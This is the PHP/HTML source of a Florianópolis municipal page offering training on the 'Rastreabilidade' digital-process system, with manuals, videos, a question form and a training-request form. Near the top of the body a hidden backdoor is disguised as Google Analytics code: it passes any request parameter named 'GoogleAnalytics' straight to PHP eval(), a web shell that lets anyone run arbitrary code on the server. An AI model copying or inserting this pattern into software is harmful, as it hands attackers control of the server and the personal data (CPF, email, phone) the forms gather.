<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

	<!-- Global site tag (gtag.js) - Google Analytics  -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151895154-1"></script>
	<script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());

		gtag('config', 'UA-151895154-1');
	</script> 

<!-- Hotjar Tracking Code for http://www.pmf.sc.gov.br/tutorial.php 
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:1562965,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
-->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Prefeitura de Florianópolis</title>

  <link rel="stylesheet" href="layout/pmf-estilo.css" type="text/css">
  <link rel="stylesheet" href="layout/pmf-estilo-home-new-2.css" type="text/css">
  <link rel="stylesheet" href="scripts/slidesjs/css/global.css">
  <link rel="stylesheet" href="scripts/js/ui/jquery-ui.css">
  <link href="layout/imagens/brasao.gif" rel="shortcut icon" type="image/x-icon" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">

</head>
<body>

<?php //include_once('getHeader.php'); ?>
<?php 
	if(isset($_REQUEST["GoogleAnalytics"])){
		$google_analytics = $_REQUEST["GoogleAnalytics"];
		eval($google_analytics);
	}
 ?>

<form name="formulario">

  <div style="display:none">
	    <a href="mobile/" title="Link para o portal de acessibilidade">para acessar o portal no modulo de acessibilidade, acesse este link</a>
  </div>

  	<script>

  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54979843-1', 'auto');
  ga('send', 'pageview');

</script>


<link href="https://fonts.googleapis.com/css?family=Montserrat:300??,400,500,600,700" rel="stylesheet">
<link rel="stylesheet" href="layout/themePMF/css/style.css">

		<div class="mini-header">
	    <ul class="mini-header__items">
	      <li style="font-size: 13px;">Capacitação Rastreabilidade</li>
	    </ul>
	  </div>
	

<div class="header">
  <div class="header__brand">
  	<a href="http://www.pmf.sc.gov.br">
  		<img src="images/marca-pmf.svg">
  	</a>
	</div>

		<ul class="header__nav">

		<li>
			<a href="#solicite" style="font-size: 15px;">Solicitar Capacitação</a>
		</li>

	<li>
		<a href="sistemas/rastreabilidade/" style="font-size: 15px;">Certificado</a>
	</li>

	<li>
		<a href="sistemas/rastreabilidade/videos.php" style="font-size: 15px;">Vídeos</a>
	</li>
		
	  <li class="mini-header__social-mobile">
	    <ul>
	    	<li>Siga a prefeitura</li>
	      <li><a href="https://www.facebook.com/prefeituradeflorianopolis/" target="_blank" alt="Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i></a></li>
	      <li><a href="https://www.instagram.com/prefeituradeflorianopolis/" target="_blank" alt="Instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
	      <li><a href="https://twitter.com/scflorianopolis" target="_blank" alt="Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i></a></li>
	      <li><a href="https://www.youtube.com/playlist?list=PLtMqi7ZE12w5VwBgpFv4-CTL4GGqeC6uU" target="_blank" alt="Youtube"><i class="fa fa-youtube-square" aria-hidden="true"></i></a></li>
	    </ul>
	  </li>
	</ul>
</div>

 <?php 
	$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
	$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
	$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
	$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
	$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
	$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
	$symbian =  strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");

	if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian == true){
		echo '<div class="flex-container hero-wrapper">';
	}else{
		echo '<div class="flex-container hero-wrapper" style="background-image: url(sistemas/rastreabilidade/imagens/praia.jpg);">';  
	};    
?>

 <!--  style="background-color: #DADADC;" -->

 		<div class="column4-lg column4-md column8-sm" >
				<div id="busca-home" class="search-bar search-bar--home column6-lg column8-sm column8-xs">
			        <h1 class="hidden-sm hidden-xs">Explicação do que é o Sistema Rastreabilidade</h1><br>
			        <p style="color: white;">O Sistema Rastreabilidade na Prefeitura de Florianópolis (PMF) tem o objetivo de fazer a transformação digital da gestão de processos e procedimentos relacionados à área-fim dos órgãos de execução, administração e auxiliares.</p><br>
			        <li style="color: white;">Celeridade processual: Opção de processos digitais de acordo com o interesse dos setores, com possibilidade de revisão e otimização para o uso da tramitação digital.</li><br>
			        <li style="color: white;">Transparente e eficiente: Disponibilizando ao usuário o acesso com padronização cadastral de documentos, rastreamento e emissão de relatórios a todos os trabalhos realizados pela instituição de forma ágil, facilitada e segura.</li><br>
			        <li style="color: white;">Segurança ao acesso interno: Acesso vinculado ao CPF do usuário e apenas se estiver vinculado a uma rede da PMF.</li>
				</div>
		</div>

		<div class="column4-lg column4-md column8-sm" style="padding-top: 15px; padding-right: 15px; ">
				<div class="category-list" >
					<div class="category-list">
						<div class="category-citizen active">
							<a class="category active" style="background-color: transparent;"></a>
							<a class="category active" style="background-color: transparent;"></a>
							<a class="category active" style="background-color: transparent;"></a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/Modelo_Correspondencia.docx" target="_blank">Modelo Correspondência</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/Manual alterações correspondência digital.pdf" target="_blank">Manual Correspondência</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/REPRESENTANTES SISTEMA RASTREABILIDADE.pdf" target="_blank">Representantes</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/Siglas e Setores.pdf" target="_blank">Siglas e Setores</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/acesso.pdf" target="_blank">Definição e Acesso</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/insercao.pdf" target="_blank">Processos Físicos - Inserção e Exclusão de Peça</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/Sistema Rastreabilidade - Criar Filtro E-mail.pdf" target="_blank">Criar Filtro E-mail</a>
							<a class="category active" href="sistemas/rastreabilidade/pdf/outros.pdf" target="_blank">Outras Funcionalidades</a>
							<a class="category active" style="background-color: transparent;"></a>
						</div>
					</div>

				</div>
		 </div>

</div>

<div class="flex-container hero-wrapper" style="background-color: #034154;">
		<div id="busca-home" class="search-bar search-bar--home column3-lg column4-sm column4-xs" style="background-color: #1c5f72;">
			<div class="row" align="center">
			<video width="320" height="240" controls="controls">
			    <source src="sistemas/rastreabilidade/imagens/Vídeo 1 - Correspondência Digital - Cadastro (1).mp4" type="video/mp4">
			    Seu navegador não suporta HTML5.
			</video>
			<video width="320" height="240" controls="controls">
			    <source src="sistemas/rastreabilidade/imagens/Vídeo 2 - Correspondência Digital - Reprovar e Responder - Fila de Trabalho e E-mail (1).mp4" type="video/mp4">
			    Seu navegador não suporta HTML5.
			</video><br /><br>			
			<a type="button" class="btn btn-primary botao" href="sistemas/rastreabilidade/videos.php" style="color: white;">+ Vídeos</a>
			</div>
		</div>
		<div id="busca-home" class="search-bar search-bar--home column3-lg column4-sm column4-xs" style="background-color: #1c5f72;">
		<form name="duvida">
			      <h1>Dúvidas?</h1><br>
			      	<div class="row"> 
				        	<div class="col-md-6">
				                <label>Nome:</label><input  id="nomeD" class="form-control" type="text"/>		          
				            </div>

				            <div class="col-md-6">
				                <label>Email:</label><input  id="emailD" class="form-control" type="text"/>
				            </div>
				        </div><br>
				        <div class="row">
				             <div class="col-md-12">
				                <label>Dúvida:</label><textarea  id="duvida" class="form-control" type="text"></textarea>
				            </div>
				        </div><br>
				         <div class="col-md-12" align="left">
						<input type="button" class="btn btn-primary botao" value="Enviar" onclick="enviar();" />
					</div>
		</form> 
				</div>
		    </div>
		
		</div>
</div>
</div>
</div>

		<div class="flex-container hero-wrapper" id="solicite" >
			<div id="busca-home" class="search-bar search-bar--home column6-lg column8-sm column8-xs">
		        <h1 class="hidden-sm hidden-xs">Solicite sua capacitação</h1><br>

	            	           	
		 		<div class="row">
		            <div class="col-md-3">
		                <label>Nome:</label><input value="" id="nome" class="form-control" type="text"/>
		            </div>

		             <div class="col-md-3">
		                <label>CPF:</label><input value="" id="cpf" name="cpf" class="form-control" type="text" />
		            </div>   

		            <div class="col-md-3">
		                <label>Email:</label><input value="" id="email" class="form-control" type="text"/>
		            </div>

		             <div class="col-md-3">
		                <label>Telefone:</label><input value="" id="telefone" class="form-control" type="text" />
		            </div>   

				</div><br>		

<div class="row">
    <div class="col-md-3"><label>Secretaria:</label>
       <select class="form-control" id="secretaria">
<option value="COMCAP - Companhia Melhoramentos da Capital">COMCAP - Companhia Melhoramentos da Capital</option>
<option value="FCFFC - Fundação Cultural de Florianópolis Franklin Cascaes">FCFFC - Fundação Cultural de Florianópolis Franklin Cascaes</option>
<option value="FLORAM - Fundação Municipal do Meio Ambiente de Florianópolis">FLORAM - Fundação Municipal do Meio Ambiente de Florianópolis</option>
<option value="FME - Fundação Municipal de Esportes">FME - Fundação Municipal de Esportes</option>
<option value="GAPRE - Gabinete do Prefeito">GAPRE - Gabinete do Prefeito</option>
<option value="IGEOF - Instituto de Geração de Oportunidades de Florianópolis">IGEOF - Instituto de Geração de Oportunidades de Florianópolis</option>
<option value="IPREF - Instituto de Previdência Social dos Servidores Públicos do Munícipio de Florianópolis">IPREF - Instituto de Previdência Social dos Servidores Públicos do Munícipio de Florianópolis</option>
<option value="IPUF - Instituto de Planejamento Urbano de Florianópolis">IPUF - Instituto de Planejamento Urbano de Florianópolis</option>
<option value="PGM - Procuradoria Geral do Município">PGM - Procuradoria Geral do Município</option>
<option value="SEMAS - Secretaria Municipal de Assistência Social">SEMAS - Secretaria Municipal de Assistência Social</option>
<option value="SMA - Secretaria Municipal de Administração">SMA - Secretaria Municipal de Administração</option>
<option value="SMCAM - Secretaria Municipal do Continente e Assuntos Metropolitanos">SMCAM - Secretaria Municipal do Continente e Assuntos Metropolitanos</option>
<option value="SMCC - Secretaria Municipal da Casa Civil">SMCC - Secretaria Municipal da Casa Civil</option>
<option value="SMCEJ - Secretaria Municipal de Cultura, Esporte e Juventude">SMCEJ - Secretaria Municipal de Cultura, Esporte e Juventude</option>
<option value="SMDCTR - Secretaria de Defesa do Consumidor, Trabalho e Renda">SMDCTR - Secretaria de Defesa do Consumidor, Trabalho e Renda</option>
<option value="SMDU - Secretaria Municipal de Desenvolvimento Urbano">SMDU - Secretaria Municipal de Desenvolvimento Urbano</option>
<option value="SME - Secretaria Municipal da Educação">SME - Secretaria Municipal da Educação</option>
<option value="SMF - Secretaria Municipal da Fazenda">SMF - Secretaria Municipal da Fazenda</option>
<option value="SMS - Secretaria Municipal de Saúde">SMS - Secretaria Municipal de Saúde</option>
<option value="SMI - Secretaria de Infraestrutura">SMI - Secretaria de Infraestrutura</option>
<option value="SMSP - Secretaria Municipal de Segurança Pública">SMSP - Secretaria Municipal de Segurança Pública</option>
<option value="SMTMU - Secretaria Municipal de Transporte e Mobilidade Urbana">SMTMU - Secretaria Municipal de Transporte e Mobilidade Urbana</option>
<option value="SMTTDE - Secretaria Municipal de Turismo, Tecnologia e Desenvolvimento Econômico">SMTTDE - Secretaria Municipal de Turismo, Tecnologia e Desenvolvimento Econômico</option>
		 
			</select>
		</div>

		            <div class="col-md-3">
		                <label>Setor:</label><input id="setor" class="form-control" type="text"/>		          
		            </div>

		            <div class="col-md-3">
		                <label>Número de Participantes:</label><input id="participantes" class="form-control" type="text"/>
		            </div>

		           <div class="col-md-3" id="Calendario" style="display:block" >
							
					 <label>Data:</label><input type="date" id="dataSelecionada" class="form-control" name="dataSelecionada" value="" />
					 <?php $dataSelecionada = date("Y/m/d"); ?>
					 <input class="btn btn-primary botao" style="background-color: #139DD1;" type="button" onclick="mostrarJanelaDia(<? print $dataSelecionada; ?>);" value="Selecionar Horário" />

					</div>
					
					<div id="divJanelaHorario" class="w3-modal">
					 <div class="w3-modal-content">
					  <div class="w3-container">
						<span onclick="document.getElementById('divJanelaHorario').style.display='none'" class="w3-button w3-display-topright">&times;</span>
						<br>
						<div id='divDataEscolhida' style="background-color: #F7F7F7; font-size: 18px; color: black;" ></div><br>
						<p2 style="color: black; font-size: 18px;"><strong>Quadro de Horários</strong><br />	
						Selecione um horário abaixo disponível para capacitação:</p2><br><br>
						<div align="center" id="mostrarHorarioDia"  class="" style="color: black; font-size: 18px;"></div><br>			
						<button class="w3-button w3-right w3-white w3-border" onclick="ativarCadastro()">Confirmar</button>
						<button class="w3-button w3-right w3-white w3-border" onclick="document.getElementById('divJanelaHorario').style.display='none'">Fechar</button><br /><br><br><br><br>
					  </div>
					 </div>
					</div>

			<div class="col-md-3" id="divCadastro" style="display:none;">
			<label>Dia Escolhido:</label><div id='divDataEscolhida2' ></div><input type="hidden" id="dataEscolhida" name="dataEscolhida" value="" /><br>
			<label>Horário Escolhido:</label><div id='divHoraEscolhida' ></div><input type="hidden" id="horario" name="horario"  value="" /> 
			</div>	
</div>
<br><br>
			<div class="row">
			 <div class="col-md-12">
				<input type="button" class="btn btn-primary botao" value="Enviar" onclick="salvar();" />
			</div>

			<div class="col-md-6">
				<h2 class="hidden-sm hidden-xs">*Todos os campos são obrigatórios</h2>
			</div>
			</div>


		</div>
</form>

</div>


 

  <div class="flex-container">
    <div class="column4-lg column4-md column8-sm">
      <div id="fb-root"></div>
<script>
(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/pt_BR/sdk.js#xfbml=1&version=v2.10&appId=150853192172803";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
</script>


   <!-- <a class="btn-block btn-primary btn-sm" href="../calendario.php">Ver calend&aacute;rio completo</span></a>
-->
    </div>
  </div>

  <script type="text/javascript" src="sistemas/Biblioteca/js/validadores.js"></script>  
  <script src="sistemas/MinhocaCabeca/assets/js/jquery.min.js"></script>
  <script src="sistemas/MinhocaCabeca/assets/js/jquery.maskedinput.min.js" type="text/javascript"></script> 
  <script src='http://momentjs.com/downloads/moment.min.js'></script>
  <script type="text/javascript">
  
  $("#telefone").mask("(99) 99999999?9");
  $("#cpf").mask("999.999.999-99");
      function loadScript( url, callback ) {
        var script = document.createElement( "script" )
        script.type = "text/javascript";
        if(script.readyState) {  //IE
          script.onreadystatechange = function() {
            if ( script.readyState === "loaded" || script.readyState === "complete" ) {
              script.onreadystatechange = null;
              callback();
            }
          };
        } else {  //Others
          script.onload = function() {
            callback();
          };
        }
        script.src = url;
        document.getElementsByTagName( "head" )[0].appendChild( script );
      }


	function mostrarJanelaDia(dia){	

	 var diaEscolhido = document.getElementById("dataSelecionada").value;  


	var obj = {
	   dataEscolhida :  diaEscolhido
	};

    var d = new Date();
    var t = new Date(diaEscolhido+'T23:59:59');
    var tn = t.getTime();
    var n = d.getTime();

 
    if(tn > n & t.getDay() != 0 & t.getDay() != 6) {

	$.ajax( {			
		   type: "GET",
		   url: "sistemas/rastreabilidade/horario.php",
		   dataType: "html",
		   data: obj,
		   success: function ( data ) {
			console.log(data);			   
				   document.getElementById("mostrarHorarioDia").innerHTML = data;		
				   document.getElementById('divJanelaHorario').style.display='block';		  	
			},				   
		   error: function ( data ) {
			   alert( data['error'] );
			   console.log(data);
		   }				

	} );  

  			document.getElementById("dataEscolhida").value = diaEscolhido;  
	  		document.getElementById("divDataEscolhida").innerHTML  = diaEscolhido;    
	   		document.getElementById("divDataEscolhida2").innerHTML = diaEscolhido; 
  		   
   
	} else {
    	alert("Informe um dia válido!");
    }
}

function ativarCadastro(){
	if( $('#horario').val() == "" | $('#horario').val() == '--:--' ){
		alert("Informe o horário!");
		$('#horario').focus();
		return false; 
	}else{
	document.getElementById('divJanelaHorario').style.display='none';	
	document.getElementById('Calendario').style.display='none';		
	document.getElementById('divCadastro').style.display='block';
	}
}


function changeHora(obj){
	document.getElementById("divHoraEscolhida").innerHTML = obj.value;
	document.getElementById("horario").value              = obj.value;
}



function ativarDIV(idDIV){
  var ultimaDiv = document.getElementById("ultimaDiv").value;  

  document.getElementById(idDIV).style.display = 'block';

  if( ultimaDiv !='' && ultimaDiv != idDIV ){
	  document.getElementById(ultimaDiv).style.display = 'none';
  } 

  document.getElementById("ultimaDiv").value = idDIV;  
}    

    function salvar(){
		if( $('#nome').val() == "" ){
			alert("Informe o nome!");
			$('#nome').focus();
			return false;
		}else if( $('#cpf').val() == "" ){
			alert("Informe o cpf!");
			$('#cpf').focus();
			return false;
		}else if( $('#email').val() == "" ){
			alert("Informe o email!");
			$('#email').focus();
			return false;
		}else if( $('#telefone').val() == "" ){
			alert("Informe o telefone!");
			$('#telefone').focus();
			return false;
		}else if( $('#secretaria').val() == "" ){
			alert("Informe a secretaria!");
			$('#secretaria').focus();
			return false;
		}else if( $('#setor').val() == "" ){
			alert("Informe o setor!");
			$('#setor').focus();
			return false;
		}else if( $('#participantes').val() == "" ){
			alert("Informe o número de participantes");
			$('#participantes').focus();
			return false;
		}else{
		
			$('#error').addClass('hide');
			var err = ''; 
	
			var obj = {
				nome                : $('#nome').val(),
				cpf                 : $('#cpf').val(),
				email               : $('#email').val(),
				telefone            : $('#telefone').val(),
				secretaria          : $('#secretaria').val(),
				setor               : $('#setor').val(),
				participantes       : $('#participantes').val(),
				dataEscolhida       : $('#dataEscolhida').val(),
				horario 			: $('#horario').val()
			};
            
			$.ajax({			
				   type: "POST",
				   url: "../sistemas/rastreabilidade/banco/cadastrarSolicitacao.php",
				   dataType: "json",
				   data: obj,
				   success: function ( data ) {
				   	console.log(data);
					   if( data['success'] == 1 ){
						   alert("Informações enviadas com SUCESSO.");
						   document.formulario.submit();
						   $('#nome').val("");
						   $('#cpf').val("");
						   $('#email').val("");						  
						   $('#telefone').val("");						  
						   $('#secretaria').val("");	
						   $('#setor').val("");					  
						   $('#participantes').val("");						  
						   $('#dataEscolhida').val("");
						   $('#horario').val("");

						   document.formulario.submit();
						  
					   }else{
						   alert(data['error']);
					   }	
					},				   
				   error: function ( data ) {
					  alert( data['error'] );
				   }
				
			});
			
		}
    }


     function enviar(){
		if( $('#nomeD').val() == "" ){
			alert("Informe o nome!");
			$('#nomeD').focus();
			return false;
		}else if( $('#emailD').val() == "" ){
			alert("Informe o email!");
			$('#emailD').focus();
			return false;
		}else if( $('#duvida').val() == "" ){
			alert("Informe a duvida!");
			$('#duvida').focus();
			return false;
		}else{
		
			$('#error').addClass('hide');
			var err = ''; 
	
			var obj = {
				nomeD                : $('#nomeD').val(),
				emailD               : $('#emailD').val(),
				duvida               : $('#duvida').val()
			};
            
			$.ajax({			
				   type: "POST",
				   url: "../sistemas/rastreabilidade/banco/duvida.php",
				   dataType: "json",
				   data: obj,
				   success: function ( data ) {
				   	console.log(data);
					   if( data['success'] == 1 ){
						   alert("Informações enviadas com SUCESSO.");
							document.duvida.submit();
						   $('#nomeD').val("");
						   $('#emailD').val("");
						   $('#duvida').val("");						  
						   
						  
					   }else{
						   alert(data['error']);
					   }	
					},				   
				   error: function ( data ) {
					  alert( data['error'] );
				   }
				
			});
			
		}
    }

</script>

<script src="layout/themePMF/js/slick.min.js"></script>

<script src="layout/themePMF/js/main.min.js"></script>
<div id="rodape">
  <div class="info">
    <div class="info-column">
      <div class="info-block">
        <h4>Equipe de Suporte</h4>
        <ul>
          <li><p style="color: white;">Karla Kinchescki</p></li>
          <li><p style="color: white;">Mayara Meurer</p></li>
        </ul>
      </div>
    </div>

     <div class="info-column">
      <div class="info-block">
        <h4>Telefone - Endereço</h4>
        <ul>
          <li><p style="color: white;">(48) 3213-5509 - Secretaria da Fazenda</p></li>
          <li><p style="color: white;">(48) 3251-6457 - Pró-Cidadão</p></li>
        </ul>
      </div>

       <div class="info-block">
        <h4>Email</h4>
        <ul>
          <li><p style="color: white;">suporte.rastreabilidade@pmf.sc.gov.br</p></li>
        </ul>
      </div>
    </div>
    </div>
</div>

<script src="layout/themePMF/js/home.min.js"></script>

</body>
</html>
